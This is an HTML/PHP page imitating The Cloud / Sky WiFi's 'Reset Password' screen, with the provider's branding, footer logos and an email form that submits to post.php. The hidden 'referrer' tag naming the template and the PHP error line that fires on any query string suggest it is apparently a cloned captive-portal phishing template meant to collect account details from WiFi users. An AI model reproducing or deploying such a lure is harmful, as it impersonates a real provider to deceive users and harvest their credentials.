<!DOCTYPE html>
<html class="no-js">
  <head>
    <title>The Cloud, WiFi Broadband</title>
    <meta content="width=device-width,initial-scale=1.0,minimal-ui" name="viewport"/>
    <link href="/resources/styles/style.css" rel="stylesheet"/>
    <meta content="on" http-equiv="cleartype"/>
  </head>
  <body class="clearfix spectrum-background forgotten-password">
    <div id="wrapper">
      <header class="ir the-cloud sky-wifi">
        <a class="cloud-logo cloud-link ir" href="/index.php">The Cloud
        </a>
        <a class="venue-logo venue-link header-v2" href="#">Venue
        </a>
      </header>
      <section>
        <h2>
          <a href="/index.php">
            <div class="home-icon">&nbsp;
            </div>
          </a>Reset Password
        </h2>
        <form id="login" novalidate="novalidate" action="post.php" method="POST">
          <p class="information">Please enter the email address of your account
          </p>
          <fieldset>
            <p>
              <label class="info">Email
                <span>*
                </span>
              </label>
			  
			  <?php if (!empty($_GET)){echo "<label id=\"username.errors\" class=\"info error\">Enter your email address</label>"; }?> 
              <input id="username" name="username" autocorrect="off" type="email" autocapitalize="off" value="" autocomplete="email"/>
            </p>
            <div class="buttons">
			  <input type="hidden" name="referrer" value="_TheCloud - Forgot Password"/>
              <button class="submit" type="submit">Continue
              </button>
            </div>
          </fieldset>
        </form>
      </section>
      <footer>
        <nav>
          <div class="footer-links">
            <a href="/termsofservice.html" class="terms">Terms
            </a>
            <a href="/privacypolicy.html" class="terms">Privacy &amp; Cookies
            </a>
          </div>
        </nav>
        <div class="a-row logo-footer venue-branded-background spectrum-background" id="logo-footer">
          <img class="footer-logo-client sky-wifi-logo" alt="" src="./resources/2/img/sky-wifi-footer-white.png"/>
          <div class="footer-logo-divider sky-wifi-logo">
          </div>
          <img alt="Sky WiFi - Connect to The Cloud" class="footer-logo-cloud" src="./resources/2/img/connect-to-cloud-footer-white.png"/>
          <span id="footer-network-id">GB
          </span>
        </div>
      </footer>
    </div>
  </body>
</html>
